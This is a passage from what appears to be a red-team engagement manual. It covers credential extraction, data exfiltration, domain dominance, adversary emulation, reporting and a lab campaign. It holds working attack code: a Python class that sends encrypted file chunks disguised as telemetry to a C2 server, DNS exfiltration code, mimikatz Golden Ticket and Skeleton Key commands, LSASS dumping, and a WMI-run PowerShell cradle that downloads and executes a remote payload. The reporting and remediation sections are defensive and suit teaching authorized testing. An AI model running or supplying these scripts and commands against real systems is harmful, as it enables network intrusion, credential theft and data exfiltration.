# Azure AD Connect stores credentials in DPAPI-protected database

# Extract Azure AD Connect credentials
# Uses AADInternals module
Import-Module AADInternals
Get-AADIntSyncCredentials

# Alternatively: Access Azure AD Connect database directly
$connectionString = "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
# Extract configuration and credentials from mms_management_agent table

# With cloud admin credentials, pivot to Azure:
# - Access Azure Key Vault secrets
# - Modify Azure AD users/groups
# - Access Azure storage accounts
# - Deploy compute for persistent cloud access

# AzureHound collection for cloud attack paths
.\azurehound.exe -d corp.onmicrosoft.com --tenant TENANT_ID list --output azure_data.json
```

---

## 7. Objective Completion

### 7.1 Data Identification and Collection — Finding Crown Jewels

The red team's objectives are defined pre-engagement but require discovery of where those assets actually reside:

**Common crown jewels by industry:**

| Industry | Crown Jewels | Typical Location |
|----------|-------------|-----------------|
| Financial | Customer financial data, trading algorithms | Database servers, file shares, code repos |
| Healthcare | Patient records (PHI), research data | EHR systems, PACS, research databases |
| Technology | Source code, IP, customer data | Git repos, build servers, data warehouses |
| Defense | Classified documents, weapons systems data | Air-gapped networks, SCIFs, secure shares |
| Retail | Payment card data, customer PII | POS systems, payment processors, CRM |

**Discovery commands:**

```powershell
# Search file shares for sensitive documents
Get-ChildItem -Path \\FileServer\Shares -Recurse -Include *.xlsx,*.docx,*.pdf `
    -ErrorAction SilentlyContinue | Where-Object {
    $_.Name -match "password|credential|confidential|secret|salary|ssn|account"
}

# Search for database connection strings
Get-ChildItem -Path C:\inetpub -Recurse -Include web.config,appsettings.json `
    -ErrorAction SilentlyContinue | Select-String -Pattern "connectionString|password"

# Find documents with classification markings
Get-ChildItem -Path \\FileServer\Shares -Recurse -Include *.docx,*.pdf `
    -ErrorAction SilentlyContinue | ForEach-Object {
    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
    if ($content -match "CONFIDENTIAL|SECRET|RESTRICTED|INTERNAL ONLY") {
        [PSCustomObject]@{File=$_.FullName; Match=$Matches[0]}
    }
}
```

### 7.2 Data Exfiltration

**Staged exfiltration with encryption:**

```python
#!/usr/bin/env python3
"""
Data staging and encrypted exfiltration.
Splits data into chunks, encrypts, and exfiltrates via HTTPS.
"""
import os
import sys
import base64
import hashlib
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class Exfiltrator:
    def __init__(self, c2_url: str, passphrase: str):
        self.c2_url = c2_url
        self.chunk_size = 512 * 1024  # 512KB chunks
        self.key = self._derive_key(passphrase)
        self.fernet = Fernet(self.key)
    
    def _derive_key(self, passphrase: str) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b"red_team_campaign_2024",
            iterations=100000
        )
        return base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))
    
    def stage_file(self, filepath: str) -> list:
        """Split file into encrypted chunks."""
        chunks = []
        with open(filepath, 'rb') as f:
            index = 0
            while True:
                data = f.read(self.chunk_size)
                if not data:
                    break
                encrypted = self.fernet.encrypt(data)
                chunk_hash = hashlib.sha256(data).hexdigest()[:8]
                chunks.append({
                    'index': index,
                    'data': base64.b64encode(encrypted).decode(),
                    'hash': chunk_hash,
                    'filename': os.path.basename(filepath)
                })
                index += 1
        return chunks
    
    def exfiltrate(self, chunks: list):
        """Send chunks via HTTPS POST disguised as API traffic."""
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Microsoft-Delivery-Optimization/10.0",
            "X-Session-Id": hashlib.md5(chunks[0]['filename'].encode()).hexdigest()
        }
        
        for chunk in chunks:
            # Disguise as telemetry data
            payload = {
                "telemetry": {
                    "deviceId": chunk['hash'],
                    "sequenceNumber": chunk['index'],
                    "payload": chunk['data'],
                    "timestamp": "2024-03-15T14:30:00Z"
                }
            }
            
            try:
                resp = requests.post(
                    f"{self.c2_url}/api/v2/telemetry/upload",
                    json=payload,
                    headers=headers,
                    timeout=30,
                    verify=True
                )
                if resp.status_code != 200:
                    return False
            except requests.exceptions.RequestException:
                return False
            
            # Randomized delay between chunks (2-8 seconds)
            import time, random
            time.sleep(random.uniform(2, 8))
        
        return True


if __name__ == "__main__":
    exfil = Exfiltrator(
        c2_url="https://cdn-static.legitimatedomain.com",
        passphrase="CAMPAIGN_SPECIFIC_PASSPHRASE"
    )
    
    # Stage and exfiltrate target file
    # In real engagement: use flags/markers, NEVER real sensitive data
    chunks = exfil.stage_file(sys.argv[1])
    success = exfil.exfiltrate(chunks)
    print(f"Exfiltration {'successful' if success else 'failed'}")
```

**DNS exfiltration (low-bandwidth, high-stealth):**

```python
#!/usr/bin/env python3
"""
DNS exfiltration: encode data into DNS queries.
Extremely slow but very difficult to detect/block.
"""
import dns.resolver
import base64
import time
import random

def dns_exfiltrate(data: bytes, domain: str, chunk_size: int = 60):
    """Exfiltrate data via DNS TXT queries."""
    encoded = base64.b32encode(data).decode().rstrip('=').lower()
    
    # Split into DNS-safe labels (max 63 chars per label)
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    session_id = random.randint(1000, 9999)
    total = len(chunks)
    
    for i, chunk in enumerate(chunks):
        # Format: <session>.<index>.<total>.<data>.<domain>
        query = f"{session_id}.{i}.{total}.{chunk}.data.{domain}"
        
        try:
            dns.resolver.resolve(query, 'TXT')
        except Exception:
            pass  # Response doesn't matter; data is in the query itself
        
        # Random delay to mimic normal DNS patterns
        time.sleep(random.uniform(0.5, 3.0))
```

### 7.3 Domain Dominance

#### Golden Ticket (T1558.001)

```powershell
# Golden Ticket: forge TGT using compromised krbtgt hash
# Requires: krbtgt NTLM hash (from DCSync or NTDS.dit)

# Mimikatz Golden Ticket creation
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:NTLM_HASH /user:Administrator /id:500 /groups:513,512,520,518,519 /ptt

# Rubeus equivalent
.\Rubeus.exe golden /rc4:KRBTGT_NTLM_HASH /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /ldap /nowrap /ptt

# Validate access
dir \\DC01.corp.local\C$
```

#### Skeleton Key (T1556.001)

```powershell
# Skeleton Key: patches LSASS on DC to accept master password alongside real ones
# Original credentials continue working — extremely stealthy

mimikatz # privilege::debug
mimikatz # misc::skeleton

# Now "mimikatz" works as password for ANY domain account
# Authentication with real password also still works
# Does not survive DC reboot
```

### 7.4 Business Impact Demonstration

The red team demonstrates what a real adversary could achieve WITHOUT causing actual harm:

- **Email access**: Screenshot inbox listing showing access to executive communications (do not read/forward actual content)
- **Financial systems**: Screenshot of payment system access proving ability to initiate transactions
- **Source code**: Clone a single repository to demonstrate access (arrange with engagement lead what flag to capture)
- **Customer data**: Access the database server, run `SELECT COUNT(*) FROM customers` — prove access without exfiltrating records
- **Infrastructure control**: Take screenshot of management console (VMware, AWS, Azure) proving ability to destroy/modify infrastructure

**Impact documentation template:**

```
Objective: Access CEO email inbox
Status: ACHIEVED
Timestamp: 2024-03-28T14:22:00Z
Evidence: Screenshot CEO_inbox_access.png (redacted)
Attack path: Phishing → Initial access (marketing user) → Credential harvest 
             → Lateral movement → Exchange admin → Inbox delegation
Business impact: Full access to executive communications, board materials, M&A discussions
Real-world risk: Corporate espionage, insider trading, competitive intelligence theft
```

### 7.5 Goal-Based Objectives

```
Engagement Objectives Tracking:
────────────────────────────────
Objective 1: Obtain Domain Admin
  Status: ACHIEVED (Day 14)
  Path: Kerberoast → cracked service account → GenericAll on DA group → DA
  
Objective 2: Access financial reporting database
  Status: ACHIEVED (Day 18)
  Path: DA → SQL Server admin → full database access
  Evidence: Row count screenshot + planted flag retrieved

Objective 3: Exfiltrate planted flag document from CEO's OneDrive
  Status: ACHIEVED (Day 22)
  Path: DA → Azure AD Connect creds → Azure AD admin → OneDrive access
  Evidence: Flag file contents match planted value

Objective 4: Remain undetected for >14 days
  Status: ACHIEVED (23 days before detection)
  Note: SOC identified anomalous login on Day 23, did not escalate until Day 25

Objective 5: Demonstrate ransomware-equivalent access
  Status: ACHIEVED (Day 20)
  Path: DA → GPO deployment → demonstrated ability to push arbitrary software
  Evidence: Benign marker file deployed to 95% of endpoints via GPO
```

---

## 8. Adversary Emulation

### 8.1 MITRE ATT&CK-Based Emulation Plans

#### APT29 (Cozy Bear) Emulation

APT29 is attributed to Russia's SVR. Known for sophisticated, patient operations targeting government and technology sectors.

**Key characteristics to emulate:**
- Heavy use of phishing with links to compromised websites
- Custom backdoors (WellMess, WellMail, SoreFang)
- Legitimate cloud services for C2 (OneDrive, Google Drive, Notion)
- Extensive use of PowerShell and WMI
- Living-off-the-land techniques
- Long dwell times (months to years)

**APT29 emulation plan (abbreviated):**

| Phase | Technique | ATT&CK ID | Implementation |
|-------|-----------|-----------|----------------|
| Initial Access | Spearphishing Link | T1566.002 | Email with link to compromised site hosting payload |
| Execution | PowerShell | T1059.001 | Encoded PowerShell download cradle |
| Persistence | Scheduled Task | T1053.005 | Task masquerading as Windows Update |
| Defense Evasion | Obfuscated Files | T1027 | Base64 + XOR encoded payloads |
| Discovery | System Information Discovery | T1082 | systeminfo, whoami /all, net group |
| Credential Access | LSASS Memory | T1003.001 | Custom MiniDump via API calls |
| Lateral Movement | WinRM | T1021.006 | PowerShell remoting with harvested creds |
| Collection | Data from Network Shared Drive | T1039 | Automated crawl of accessible shares |
| Exfiltration | Exfil Over Web Service | T1567.002 | Upload to legitimate cloud storage API |

#### FIN7 Emulation

FIN7 targets retail, hospitality, and restaurant sectors for financial gain. Known for sophisticated social engineering and custom malware (Carbanak/BATELEUR).

**FIN7 signature techniques:**
- Highly targeted spearphishing with malicious DOCX/XLSX
- Custom JScript/VBScript loaders
- HALFBAKED and BATELEUR backdoors
- Focus on POS systems and payment infrastructure
- Use of legitimate admin tools (PowerShell Empire, Cobalt Strike)

#### Lazarus Group Emulation

North Korean APT focused on financial theft and espionage. Operates with high sophistication and patience.

**Lazarus characteristics:**
- Cryptocurrency exchange targeting
- Custom malware families (FALLCHILL, HOPLIGHT)
- Watering hole attacks against financial sector sites
- LinkedIn-based social engineering (fake recruiter personas)
- Supply chain attacks targeting software build pipelines

### 8.2 MITRE Engenuity ATT&CK Evaluations

MITRE Engenuity conducts annual evaluations of security products against real adversary techniques. These evaluations provide:

- Standardized testing methodology
- Detection categorization (Telemetry, General, Tactic, Technique)
- Coverage mapping against specific threat groups
- Vendor-neutral comparison framework

**Using evaluation results for red team planning:**
1. Review target organization's security stack against evaluation results
2. Identify techniques with low detection rates across the deployed products
3. Prioritize those techniques in the emulation plan
4. After engagement, validate whether detection gaps matched predictions

### 8.3 Atomic Red Team — Individual Technique Testing

Atomic Red Team provides small, portable tests for individual ATT&CK techniques. Used for:
- Validating detection rules for specific techniques
- Baselining security control effectiveness
- Quick purple team exercises
- Post-engagement validation of remediation

```yaml
# Example: Atomic Test for T1003.001 - LSASS Memory Dump
attack_technique: T1003.001
display_name: "OS Credential Dumping: LSASS Memory"
atomic_tests:
  - name: "Dump LSASS.exe Memory using comsvcs.dll"
    auto_generated_guid: a1234567-b890-1234-cdef-567890abcdef
    description: |
      Uses comsvcs.dll MiniDump export to dump LSASS process memory.
    supported_platforms:
      - windows
    executor:
      command: |
        $lsassPid = (Get-Process lsass).Id
        C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid #{output_file} full
      cleanup_command: |
        Remove-Item #{output_file} -Force -ErrorAction SilentlyContinue
      name: powershell
      elevation_required: true
    input_arguments:
      output_file:
        description: Path for the dump file
        type: path
        default: C:\Windows\Temp\lsass.dmp
```

```bash
# Running Atomic tests via Invoke-AtomicRedTeam
# Install
Install-Module -Name invoke-atomicredteam -Force
Import-Module invoke-atomicredteam

# Execute specific test
Invoke-AtomicTest T1003.001 -TestNumbers 1

# Execute with cleanup
Invoke-AtomicTest T1003.001 -TestNumbers 1 -Cleanup

# List available tests for a technique
Invoke-AtomicTest T1059.001 -ShowDetailsBrief
```

### 8.4 CALDERA — Automated Adversary Emulation

MITRE CALDERA is an automated adversary emulation platform that chains ATT&CK techniques into operations:

```yaml
# CALDERA Adversary Profile - APT29 Emulation
---
adversary:
  name: APT29_Emulation
  description: "Emulates APT29 initial access through domain dominance"
  objective: "full_domain_compromise"
  
  atomic_ordering:
    # Reconnaissance
    - id: "system_discovery"
      technique: T1082
      command: "systeminfo && whoami /all && net group 'Domain Admins' /domain"
      
    # Credential Access
    - id: "credential_dump"
      technique: T1003.001
      command: "rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id dump.bin full"
      requires: ["admin_access"]
      
    # Lateral Movement
    - id: "lateral_winrm"
      technique: T1021.006
      command: "Invoke-Command -ComputerName #{target} -ScriptBlock {whoami}"
      requires: ["credential_dump"]
      
    # Domain Escalation
    - id: "dcsync"
      technique: T1003.006
      command: "mimikatz lsadump::dcsync /domain:#{domain} /user:krbtgt"
      requires: ["domain_admin"]
```

### 8.5 AttackIQ / SafeBreach — Continuous Security Validation

These platforms automate adversary simulation for continuous testing:

- **Deployment**: Agents on endpoints simulate attacker behavior on schedule
- **Coverage**: Map test results to ATT&CK matrix for visibility into detection gaps
- **Trending**: Track detection capability over time
- **Integration**: Trigger tests after security control changes to validate effectiveness
- **Reporting**: Executive dashboards showing "percentage of techniques detected"

### 8.6 Custom Emulation Plan Development

**Process for developing a custom emulation plan from threat intelligence:**

```
Step 1: Gather threat intelligence
├── Industry-specific threat reports
├── Previous incidents (target or peers)
├── MITRE ATT&CK group profiles
└── Threat intelligence feeds

Step 2: Map intelligence to techniques
├── Extract IOCs and behaviors from reports
├── Map behaviors to ATT&CK technique IDs
├── Identify execution order and dependencies
└── Note tool-specific implementations

Step 3: Develop procedures
├── For each technique, define:
│   ├── Specific commands/tools to use
│   ├── Expected artifacts generated
│   ├── Success criteria
│   └── Fallback procedures
├── Define abort criteria per phase
└── Plan deconfliction artifacts

Step 4: Build execution timeline
├── Phase gates (go/no-go decisions)
├── Timing constraints (business hours, dwell time simulation)
├── Parallel vs sequential technique execution
└── Reporting checkpoints

Step 5: Validation
├── Test procedures in lab environment
├── Verify detection artifacts are generated
├── Confirm cleanup procedures work
└── Rehearse abort procedures
```

---

## 9. Reporting and Debrief

### 9.1 Executive Report

The executive report communicates business risk to non-technical stakeholders. It must be concise, action-oriented, and focused on impact.

**Executive report template:**

```markdown
# Red Team Assessment — Executive Summary
## [Organization Name] | [Date Range]

### Engagement Overview
- **Objective**: [State the business question being answered]
- **Duration**: [N] weeks
- **Adversary emulated**: [APT group or custom threat profile]
- **Scope**: [What was in/out of scope]

### Key Findings

| # | Finding | Business Risk | Severity |
|---|---------|--------------|----------|
| 1 | Domain admin achieved from external phishing | Complete infrastructure compromise | CRITICAL |
| 2 | Executive email accessible without MFA enforcement | Corporate espionage, insider trading | CRITICAL |
| 3 | Lateral movement undetected for 23 days | Extended dwell time enables maximum damage | HIGH |
| 4 | Financial database accessible from workstation tier | Regulatory violation, data breach | HIGH |

### Objectives Achieved
- [x] Gain domain administrator access (Day 14)
- [x] Access financial reporting systems (Day 18)
- [x] Simulate data exfiltration (Day 22)
- [x] Remain undetected >14 days (23 days)
- [ ] Compromise backup infrastructure (not achieved — well segmented)

### Risk Rating: HIGH
The assessment demonstrated that a moderately sophisticated adversary 
can achieve complete compromise of [Organization]'s IT infrastructure 
from an initial phishing email within two weeks, remaining undetected 
for over three weeks.

### Top Recommendations
1. **Immediate** (0-30 days): Enforce MFA on all privileged accounts
2. **Short-term** (30-90 days): Implement EDR with behavioral detection
3. **Medium-term** (90-180 days): Network segmentation between tiers
4. **Strategic** (6-12 months): SOC maturity program with purple team exercises
```

### 9.2 Technical Report

The technical report provides the full attack narrative with evidence, timestamps, and detailed findings.

**Technical report structure:**

```markdown
# Red Team Technical Report
## [Campaign Codename] | [Organization] | [Dates]

### 1. Methodology
- Adversary emulated: [Group + justification]
- ATT&CK techniques planned: [List with IDs]
- Infrastructure used: [High-level architecture]
- Tools used: [List with version numbers]

### 2. Attack Narrative

#### Phase 1: Reconnaissance (Day 1-5)
- **Action**: OSINT collection on target personnel
- **Timestamp**: 2024-03-01T09:00:00Z
- **Technique**: T1589 - Gather Victim Identity Information
- **Detail**: Identified 47 employees in Finance department via LinkedIn.
  Discovered email naming convention: first.last@target-corp.com.
  Found three employees discussing internal "FinancePortal" system in public posts.
- **Evidence**: [Screenshot reference]
- **Detection opportunity**: None (passive reconnaissance)

#### Phase 2: Initial Access (Day 6-8)
- **Action**: Spearphishing campaign targeting Finance department
- **Timestamp**: 2024-03-06T14:30:00Z
- **Technique**: T1566.001 - Phishing: Spearphishing Attachment
- **Detail**: Sent credential harvesting email to 12 Finance employees.
  3 clicked link, 2 entered credentials, 1 credential valid.
  Compromised user: j.smith@target-corp.com (Financial Analyst)
- **Evidence**: [GoPhish campaign results, credential capture log]
- **Detection opportunity**: Email gateway should flag lookalike domain.
  No alert generated.

[Continue for each action throughout the campaign...]

### 3. Findings Detail

#### Finding 1: Weak Password Policy Enables Credential Spray
- **Severity**: HIGH
- **ATT&CK Technique**: T1110.003
- **Description**: [Detailed explanation]
- **Evidence**: [Screenshots, logs, proof]
- **Impact**: [Business impact description]
- **Recommendation**: [Specific remediation steps]
- **References**: [NIST, CIS Benchmark, etc.]

### 4. Detection Gap Analysis

| Technique | ATT&CK ID | Detected? | Alert Generated? | Escalated? | Time to Detect |
|-----------|-----------|-----------|------------------|------------|----------------|
| Phishing | T1566.001 | No | No | N/A | N/A |
| PowerShell Exec | T1059.001 | Yes | Yes | No | 2 hours |
| LSASS Dump | T1003.001 | No | No | N/A | N/A |
| Lateral Movement | T1021.006 | No | No | N/A | N/A |
| DCSync | T1003.006 | Yes | Yes | Yes | 4 hours |

### 5. Timeline
[Complete chronological list of all red team actions with timestamps]

### 6. IOCs Generated
[List of all artifacts the blue team should look for during forensic review]

### 7. Remediation Roadmap
[Prioritized list with effort estimates]
```

### 9.3 Purple Team Debrief

The purple team debrief is the highest-value deliverable of a red team engagement. It transforms adversarial findings into defensive improvements.

**Debrief agenda:**

```
Purple Team Debrief — Agenda (4-6 hours)
─────────────────────────────────────────
1. Attack walkthrough (Red Team presents)
   - Step-by-step narration of entire campaign
   - At each step: "what artifacts did we generate?"
   - Blue team checks: "did we see this?"

2. Detection gap analysis (Joint)
   - For each missed detection:
     - Was telemetry available? (Log source exists?)
     - Was telemetry collected? (Forwarded to SIEM?)
     - Was a rule/query possible? (Detection engineering feasible?)
     - What blocked detection? (Noise, missing logs, no rule)

3. Detection development (Blue Team leads)
   - For top-5 gaps: write detection rules live
   - Red team validates rules against their techniques
   - Test rules against recorded attack data

4. Improvement plan (Joint)
   - Quick wins (1-2 weeks): Alert rule additions, log source additions
   - Medium-term (1-3 months): Tool deployment, process changes
   - Strategic (3-12 months): Architecture changes, team augmentation

5. Retesting agreement
   - Red team agrees to re-run specific techniques in [N] weeks
   - Validates that new detections work
   - Closes the loop
```

### 9.4 Metrics

Effective red team programs track metrics across engagements to demonstrate security posture improvement:

| Metric | Definition | Target Trend |
|--------|-----------|-------------|
| **Time to Initial Compromise** | Duration from campaign start to first foothold | Increasing |
| **Time to Objective** | Duration from foothold to objective completion | Increasing |
| **Time to Detect (TTD)** | Duration from red team action to SOC alert | Decreasing |
| **Time to Respond (TTR)** | Duration from alert to containment action | Decreasing |
| **Technique Detection Rate** | % of ATT&CK techniques generating alerts | Increasing |
| **Mean Dwell Time** | Average time red team operates before detection | Decreasing |
| **Objective Completion Rate** | % of engagement objectives achieved | Decreasing |
| **Control Effectiveness** | % of security controls that worked as designed | Increasing |
| **Phishing Click Rate** | % of targeted users who clicked/engaged | Decreasing |
| **Credential Harvest Rate** | % of phished users who submitted credentials | Decreasing |

**Trend visualization (engagement over engagement):**

```
Metric: Mean Time to Detect (days)
─────────────────────────────────
Engagement 1 (Q1 2023):  ████████████████████████  23 days
Engagement 2 (Q3 2023):  ████████████████         15 days
Engagement 3 (Q1 2024):  ██████████               9 days
Engagement 4 (Q3 2024):  ██████                   5 days
Target:                   ███                      2 days
```

### 9.5 Remediation Roadmap

```markdown
# Remediation Roadmap

## Quick Wins (0-30 days, minimal effort)
- [ ] Enforce MFA on all privileged accounts (VPN, email, admin portals)
- [ ] Deploy LSASS protection (Credential Guard or RunAsPPL)
- [ ] Block macro execution in documents from external sources
- [ ] Add detection rules for: PsExec, WinRM from workstations, Kerberoasting
- [ ] Enable PowerShell Script Block Logging on all endpoints
- [ ] Restrict outbound DNS to corporate resolvers only

## Short-Term (30-90 days, moderate effort)
- [ ] Deploy EDR solution with behavioral detection capability
- [ ] Implement tiered administration (separate admin accounts per tier)
- [ ] Segment workstation VLANs from server VLANs (block direct SMB/RDP)
- [ ] Implement email authentication (DMARC reject, DKIM, SPF -all)
- [ ] Configure Group Policy to restrict PowerShell to Constrained Language Mode
- [ ] Deploy honeytokens (fake admin accounts, fake shares) for early warning

## Medium-Term (90-180 days, significant effort)
- [ ] Implement Privileged Access Workstations (PAW) for Tier 0 administration
- [ ] Deploy network detection and response (NDR) capability
- [ ] Implement AD CS security hardening (disable vulnerable templates)
- [ ] Deploy application whitelisting on critical servers
- [ ] Implement just-in-time (JIT) privileged access
- [ ] Establish 24/7 SOC monitoring capability

## Strategic (6-12 months, major investment)
- [ ] Zero-trust network architecture implementation
- [ ] Security orchestration and automated response (SOAR) deployment
- [ ] Mature purple team program (quarterly exercises)
- [ ] Insider threat detection program
- [ ] Deception technology deployment at scale
- [ ] Security awareness program redesign (simulation-based)
```

---

## 10. Lab: Red Team Campaign

### 10.1 Lab Environment Architecture

```
Lab Network Topology:
─────────────────────
                                    ┌────────────────────┐
                                    │   INTERNET (sim)   │
                                    │   10.0.0.0/24      │
                                    └────────┬───────────┘
                                             │
                                    ┌────────▼───────────┐
                                    │   FIREWALL/NAT     │
                                    │   10.0.0.1/10.10.0.1│
                                    └────────┬───────────┘
                                             │
                         ┌───────────────────┼───────────────────┐
                         │                   │                    │
              ┌──────────▼────────┐  ┌──────▼───────┐  ┌───────▼────────┐
              │  DMZ (10.10.0/24) │  │  CORP LAN    │  │  SERVER LAN    │
              │                   │  │  (10.10.10/24)│  │  (10.10.20/24) │
              │  - Web Server     │  │              │  │                │
              │  - Mail Server    │  │  - WS01-05   │  │  - DC01        │
              │  - VPN Gateway    │  │  - Admin WS  │  │  - SQL01       │
              └───────────────────┘  └──────────────┘  │  - FILE01      │
                                                        │  - EXCH01      │
                                                        └────────────────┘

Lab Machines:
- ATTACK-BOX: Kali Linux (10.0.0.100) — Red team operator machine
- DC01: Windows Server 2022 (10.10.20.10) — Domain Controller (corp.local)
- SQL01: Windows Server 2019 (10.10.20.20) — SQL Server
- FILE01: Windows Server 2019 (10.10.20.30) — File Server
- EXCH01: Windows Server 2019 (10.10.20.40) — Exchange Server (simulated)
- WS01-05: Windows 11 (10.10.10.50-54) — User workstations
- MAIL01: Ubuntu 22.04 (10.10.0.20) — External mail gateway
- WEB01: Ubuntu 22.04 (10.10.0.30) — Corporate website
```

### 10.2 Campaign Execution — Full Attack Chain

**Phase 0: OSINT (Day 1-2)**

```bash
# Timestamp: 2024-03-01T09:15:00Z
# Action: Email enumeration via public sources

# Enumerate employees from LinkedIn (simulated in lab via OSINT data file)
cat /opt/campaign/osint/employees.txt
# Output:
# john.smith - Financial Analyst
# sarah.jones - VP Finance
# mike.chen - IT Administrator
# lisa.park - Marketing Manager
# david.wilson - CEO

# Determine email format from public sources
# Convention discovered: first.last@corp.local (internal) / corp-target.com (external)

# Technology fingerprinting of external perimeter
nmap -sV -sC -p 25,80,443,993,995 10.10.0.0/24 -oA /opt/campaign/recon/perimeter_scan

# Identify mail server for phishing infrastructure compatibility
dig MX corp-target.com
# Check SPF/DKIM/DMARC records
dig TXT corp-target.com
dig TXT _dmarc.corp-target.com
```

**Phase 1: Infrastructure Setup (Day 2-3)**

```bash
# Timestamp: 2024-03-02T10:00:00Z
# Action: Deploy phishing and C2 infrastructure

# Start Sliver C2 (already deployed in lab)
cd /opt/sliver && ./sliver-server

# Generate implant
sliver > generate --mtls 10.0.0.100 --os windows --arch amd64 \
    --format shellcode --name CORP_BEACON --skip-symbols

# Start listener
sliver > mtls --lhost 10.0.0.100 --lport 8888

# Configure GoPhish
# Campaign: corp-target Finance Portal Update
# Landing page: Cloned SSO page with credential capture
# Tracking: Open + click + submit tracking enabled
```

**Phase 2: Initial Access via Phishing (Day 4)**

```bash
# Timestamp: 2024-03-04T14:30:00Z
# Action: Launch phishing campaign

# Target: john.smith (Financial Analyst) — chosen for likely access to financial systems
# Pretext: Finance Portal requires re-authentication due to security update
# Payload: Credential harvesting + malicious HTA download on second stage

# GoPhish results after 4 hours:
# - 3/5 targets opened email
# - 2/5 clicked link
# - 1/5 entered credentials (john.smith:Summer2024!)
# - Timestamp of credential capture: 2024-03-04T16:45:00Z

# Validate credentials
crackmapexec smb 10.10.10.50 -u john.smith -p 'Summer2024!' -d corp.local
# [+] corp.local\john.smith:Summer2024! (Pwn3d!)
```

**Phase 3: Initial Foothold (Day 4-5)**

```bash
# Timestamp: 2024-03-04T17:00:00Z
# Action: Establish C2 on john.smith's workstation (WS01)

# Method: Use valid credentials to deploy implant via WMI
# (Simulating post-credential-harvest malware delivery)

# Generate PowerShell stager
sliver > generate stager --lhost 10.0.0.100 --lport 8888 \
    --protocol tcp --os windows --format raw --save /tmp/stager.bin

# Encode for PowerShell delivery
cat /tmp/stager.bin | base64 -w 0 > /tmp/stager.b64

# Execute on WS01 via WMI (using impacket)
wmiexec.py corp.local/john.smith:'Summer2024!'@10.10.10.50 \
    "powershell -nop -w hidden -enc $(cat /tmp/stager.b64)"

# Verify callback in Sliver
sliver > sessions
# [*] Session 1 - CORP_BEACON - 10.10.10.50 - WS01\john.smith
```

**Phase 4: Internal Reconnaissance (Day 5-7)**

```bash
# Timestamp: 2024-03-05T09:00:00Z
# Action: Enumerate Active Directory from compromised workstation

# In Sliver session:
sliver (CORP_BEACON) > shell

# System information
systeminfo
whoami /all
net user john.smith /domain
net group "Domain Admins" /domain

# Network discovery
arp -a
ipconfig /all
net view /domain

# Find domain controllers
nltest /dclist:corp.local

# Enumerate shares
net view \\FILE01 /all
net view \\DC01 /all

# Run SharpHound (uploaded via Sliver)
sliver (CORP_BEACON) > upload /opt/tools/SharpHound.exe C:\\Windows\\Temp\\sh.exe
sliver (CORP_BEACON) > execute C:\\Windows\\Temp\\sh.exe -c All --outputdirectory C:\\Windows\\Temp

# Download BloodHound data
sliver (CORP_BEACON) > download C:\\Windows\\Temp\\*_BloodHound.zip /opt/campaign/bloodhound/
```

**BloodHound analysis results:**

```cypher
// Finding: john.smith → GenericAll on SQL01 computer object
// Finding: SQL01 has constrained delegation to DC01 (MSSQL/DC01)
// Finding: svc_sql (Kerberoastable) is local admin on SQL01
// Attack path: john.smith → Kerberoast svc_sql → SQL01 admin → constrained delegation → DC01
```

**Phase 5: Privilege Escalation (Day 8-10)**

```bash
# Timestamp: 2024-03-08T10:30:00Z
# Action: Kerberoast svc_sql service account

# Using Rubeus (reflectively loaded in memory)
sliver (CORP_BEACON) > execute-assembly /opt/tools/Rubeus.exe kerberoast /user:svc_sql /format:hashcat /outfile:C:\\Windows\\Temp\\hash.txt

# Download and crack offline
sliver (CORP_BEACON) > download C:\\Windows\\Temp\\hash.txt /opt/campaign/creds/

# Crack with hashcat
hashcat -m 13100 hash.txt /opt/wordlists/rockyou.txt -r /opt/rules/best64.rule
# Result: svc_sql:SqlServer2024!

# Timestamp: 2024-03-08T11:00:00Z
# Validate credential
crackmapexec smb 10.10.20.20 -u svc_sql -p 'SqlServer2024!' -d corp.local
# [+] corp.local\svc_sql:SqlServer2024! (Pwn3d!) — LOCAL ADMIN on SQL01
```

**Phase 6: Lateral Movement (Day 10-12)**

```bash
# Timestamp: 2024-03-10T13:00:00Z
# Action: Move to SQL01 using svc_sql credentials

# Deploy second implant on SQL01
sliver > generate --mtls 10.0.0.100 --os windows --arch amd64 \
    --format exe --name SQL_BEACON --skip-symbols

# Upload and execute via WMI
wmiexec.py corp.local/svc_sql:'SqlServer2024!'@10.10.20.20 \
    "powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://10.0.0.100/payload.ps1'))"

# Verify session
sliver > sessions
# [*] Session 2 - SQL_BEACON - 10.10.20.20 - SQL01\svc_sql

# Timestamp: 2024-03-10T14:00:00Z
# Action: Dump credentials from SQL01
sliver (SQL_BEACON) > execute-assembly /opt/tools/Rubeus.exe dump /nowrap
# Captured TGTs for: svc_sql, local administrator
```

**Phase 7: Domain Admin via Constrained Delegation (Day 12-14)**

```bash
# Timestamp: 2024-03-12T09:30:00Z
# Action: Abuse constrained delegation from SQL01 to DC01

# SQL01 has constrained delegation to DC01 for MSSQL service
# S4U2Self + S4U2Proxy to request ticket as Domain Admin to DC01

sliver (SQL_BEACON) > execute-assembly /opt/tools/Rubeus.exe s4u \
    /user:SQL01$ /rc4:MACHINE_NTLM_HASH \
    /impersonateuser:Administrator \
    /msdsspn:cifs/DC01.corp.local \
    /ptt

# Verify Domain Admin access
sliver (SQL_BEACON) > shell
dir \\DC01.corp.local\C$
# Directory listing confirms DA access

# Timestamp: 2024-03-12T10:00:00Z (Day 14 — Objective 1 achieved)
# OBJECTIVE 1 COMPLETE: Domain Admin access obtained
```

**Phase 8: Objective Completion (Day 14-18)**

```bash
# Timestamp: 2024-03-14T11:00:00Z
# Action: Access financial database (Objective 2)

# Connect to SQL01 database with DA privileges
sqlcmd -S SQL01 -d FinanceDB -Q "SELECT COUNT(*) FROM Transactions"
# Result: 1,247,893 records accessible

# Capture evidence (screenshot + row count only — no actual data exfiltration)
# OBJECTIVE 2 COMPLETE: Financial database access demonstrated

